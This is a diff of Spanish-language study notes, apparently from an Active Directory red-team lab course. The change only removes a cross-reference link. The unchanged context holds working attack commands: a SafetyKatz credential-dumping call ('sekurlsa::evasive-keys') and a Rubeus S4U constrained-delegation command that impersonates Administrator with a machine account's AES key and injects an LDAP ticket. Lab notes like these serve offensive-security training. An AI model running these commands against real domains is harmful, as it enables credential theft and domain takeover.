@@ -522,8 +522,6 @@ C:\Users\Public\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-k
 
 2. Una vez obtenida su `aes256` del equipo, podemos realizar un **S4U** y pedir un `/altservice` como `LDAP`,  `HTTP` o `CIFS` en caso de que tenga un SPN inofensivo.
 
-Para más información --> [[6.16 - Learning Objective 16#Constrained Delegation (Computer)|Constrained Delegation (Computer)]]
- 
 ```powershell
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-srv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.local /altservice:ldap /ptt
 ```
